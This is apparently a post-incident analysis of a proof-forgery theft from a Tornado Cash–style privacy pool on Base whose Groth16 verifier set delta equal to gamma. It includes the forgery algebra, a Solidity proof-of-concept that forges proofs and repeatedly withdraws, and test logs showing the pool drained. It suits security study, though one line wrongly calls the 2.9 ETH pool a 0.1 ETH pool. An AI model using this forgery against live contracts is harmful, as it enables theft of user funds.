## ZK Proof Forgery via Misconfigured Groth16 Verifier

| Field | Detail |
|---|---|
| **Chain** | Base
| **Block** | 42,410,815 |
| **Impact** | 2.9 ETH |
| **Root Cause** | `delta2 == gamma2` in the Groth16 verification key |

| Role | Address |
|---|---|
| Privacy Pool | `0xD3560eF60Dd06E27b699372c3da1b741c80B7D90` |
| Groth16 Verifier | `0x1E65C075989189E607ddaFA30fa1a0001c376cfd` |
| Attacker Contract | `0x5F68aD46F500949FA7E94971441F279A85cB3354` |
| Attacker Recipient | `0x49A7CA88094B59b15EaA28C8c6d9BFAb78d5F903` |

---

## Summary

An attacker exploited a fatal misconfiguration in the Groth16 zk-SNARK verifier used by Veil Protocol on Base, the verification key's `delta` parameter was set identical to `gamma` (both equal to the BN254 G2 generator), completely breaking the soundness of the proof system, this allowed the attacker to forge valid zero-knowledge proofs for arbitrary public inputs and drain the entire 0.1 ETH privacy pool with 29 fraudulent withdrawals in a single transaction, without ever having deposited.

<img width="1801" height="231" alt="image" src="https://github.com/user-attachments/assets/65651624-98cb-4072-a076-f70d58128243" />

---

## Veil Protocol

Veil is a privacy pool deployed on Base, forked from Tornado Cash, users deposit a fixed denomination (0.1 ETH) and receive a secret note, to withdraw, they generate a zk-SNARK proof demonstrating knowledge of a valid deposit without revealing which one, preserving privacy.

## Groth16 Proof System

Groth16 is the most widely used zk-SNARK construction, verification relies on a bilinear pairing check over four pairs of elliptic curve points:

```
e(-A, B) * e(alpha1, beta2) * e(vk_x, gamma2) * e(C, delta2) == 1
```

- `(A, B, C)` = the proof elements submitted by the prover
- `(alpha1, beta2, gamma2, delta2)` = verification key parameters from the trusted setup
- `vk_x` = linear combination of public inputs with the `IC[]` points

**Critical invariant**: `gamma2` and `delta2` must be distinct, independent group elements, If they are equal, the prover gains a degree of freedom that allows forging proofs without a valid witness.

---

## Root cause

The Groth16 verifier deployed at `0x1E65C...` has its verification key parameters `delta2` and `gamma2` set to the **exact same value** -- the BN254 G2 generator point:

```
gamma2 = delta2 = (
  x.im = 11559732032986387107991004021392285783925812861821192530917403151452391805634
  x.re = 10857046999023057135944570762232829481370756359578518086990519993285655852781
  y.im = 4082367875863433681332203403145435568316851327593401208105741076214120093531
  y.re = 8495653923123431417604973247489272438418190587263600148770280649306958101930
)
```

This is the most basic misconfiguration possible: both parameters are set to the G2 generator, meaning the trusted setup ceremony was either skipped, improperly executed, or the deployment used placeholder/test values.

When `delta2 == gamma2`, the pairing check can be trivially satisfied.

**Normal Groth16 pairing check:**

```
e(-A, B) * e(alpha1, beta2) * e(vk_x, gamma2) * e(C, delta2) == 1
```

**Exploit**

1. Set `A = alpha1` (from the public verification key)
2. Set `B = beta2` (from the public verification key)
3. Set `C = -vk_x` (negate the public input accumulation point)

**Result with `delta2 == gamma2`**

```
e(-alpha1, beta2) * e(alpha1, beta2) * e(vk_x, gamma2) * e(-vk_x, gamma2)
       \___________________/                    \____________________/
              = 1                                        = 1

= 1 * 1 = 1   (check passes)
```

<img width="924" height="200" alt="image" src="https://github.com/user-attachments/assets/07184b48-ea98-491e-a3e8-63c15c7e5976" />

The first two terms cancel (point and its negation paired with the same G2 element), the last two terms cancel because `delta2 == gamma2` and `C = -vk_x`. **No knowledge of the witness is required.**

For each withdrawal, the verifier computes `vk_x` from the public inputs using the `IC[]` points hardcoded in the verifier

```
vk_x = IC[0] + input[0] * IC[1] + input[1] * IC[2] + input[2] * IC[3]
             + input[3] * IC[4] + input[4] * IC[5] + input[5] * IC[6]
```

<img width="888" height="469" alt="image" src="https://github.com/user-attachments/assets/06d8bb18-af27-4d76-ac93-102b1185406c" />

The public inputs are:

| Index | Field | Value (1st withdrawal) |
|---|---|---|
| 0 | Merkle root | `0x2e0f278810b48...958c063` |
| 1 | Nullifier hash | `0xdead0000` |
| 2 | Recipient | `0x49A7CA88...d5F903` |
| 3 | Relayer | `0x0` |
| 4 | Fee | `0` |
| 5 | Refund | `0` |

Since inputs 3-5 are zero, their `IC` contributions vanish, the attacker computes

```
vk_x = IC[0] + root * IC[1] + nullifier * IC[2] + recipient * IC[3]
```

Then sets `C = (vk_x.x, P - vk_x.y)` where `P` is the BN254 base field modulus, effectively computing `C = -vk_x` on the elliptic curve.

### IC Points (Verification Key)

Extracted from the on-chain verifier bytecode

```
IC[0] = (7973665934633372...547207, 2206284249359232...686244)
IC[1] = (15935917542493937...284825, 7483347661901730...282062)
IC[2] = (17541785693502679...891035, 1878998464440192...154018)
IC[3] = (15219522276005360...238313, 7599924382270821...990085)
```

---

### Exec Flow

The entire attack was executed in **a single transaction** within block 42,410,815

```
1. Deploy attacker contract (0x5F68...354)

2. Read pool state:
   - getLastRoot()    -> 0x2e0f278810b48...
   - isKnownRoot()    -> true
   - denomination()   -> 0.1 ETH

3. Loop 29 times (i = 0..28):
   a. nullifier = 0xdead0000 + i
   b. Compute vk_x via ecmul/ecadd precompiles (0x06, 0x07)
   c. Forge proof: A = alpha1, B = beta2, C = -vk_x
   d. withdraw(A, B, C, root, nullifier, recipient, ...)
      -> verifyProof() returns true
      -> 0.1 ETH sent to recipient
      -> Withdrawal event emitted

4. Result: 29 * 0.1 = 2.9 ETH drained
```

The attacker used obviously fabricated nullifier hashes

| Index | Nullifier Hash |
|---|---|
| 0 | `0x00000000...dead0000` |
| 1 | `0x00000000...dead0001` |
| ... | ... |
| 28 | `0x00000000...dead001c` |

These are clearly fake -- no valid Tornado Cash commitment would produce these nullifiers, yet the pool accepted them because the proof verification passed due to the broken verifier.

### Output

<img width="916" height="481" alt="image" src="https://github.com/user-attachments/assets/a0acd739-1331-42fb-881d-f8e2bdb68c26" />

```
[PASS] testDeltaEqualsGamma()
[PASS] testExploit() (gas: 8418220)
Logs:
  --- Pre-attack state ---
    Pool balance      : 2.900000000000000000
    Attacker balance  : 0.000000000000000000
    Denomination      : 0.100000000000000000
    Merkle root       : 0x2e0f278810b48ef1...

  --- Post-attack state ---
    Pool balance      : 0.000000000000000000
    Attacker balance  : 2.900000000000000000
    ETH stolen        : 2.900000000000000000
    Gas used          : 8314445
```

### Core Logic

```solidity
// For each withdrawal:
bytes32 root = pool.getLastRoot();
bytes32 nullifier = bytes32(uint256(0xdead0000 + i));

// 1. Compute vk_x from public inputs using IC points and BN254 precompiles
(uint256 cx, uint256 cy) = computeVkX(root, nullifier, recipient);

// 2. Forge proof: A = alpha1, B = beta2, C = -vk_x
uint256[2]    memory pA = [ALPHA_X, ALPHA_Y];
uint256[2][2] memory pB = [[BETA_X1, BETA_X2], [BETA_Y1, BETA_Y2]];
uint256[2]    memory pC = [cx, P - cy];  // negate Y = point negation on BN254

// 3. Withdraw -- proof passes because delta2 == gamma2
pool.withdraw(pA, pB, pC, root, nullifier, recipient, address(0), 0, 0);
```

---

## References

- [Groth16 Paper (Jens Groth, 2016)](https://eprint.iacr.org/2016/260.pdf) -- Original proof system specification
- [EIP-196: BN254 Precompile (ecAdd, ecMul)](https://eips.ethereum.org/EIPS/eip-196) -- BN254 base field modulus P = `21888242871839275222246405745257275088696311157297823662689037894645226208583`
- [EIP-197: BN254 Pairing Precompile](https://eips.ethereum.org/EIPS/eip-197) -- Pairing check used by Groth16 verifiers
- [Tornado Cash Contracts](https://github.com/tornadocash/tornado-core) -- Original privacy pool implementation
- [snarkjs](https://github.com/iden3/snarkjs) -- zkSNARK toolchain for Groth16 proof generation and verification
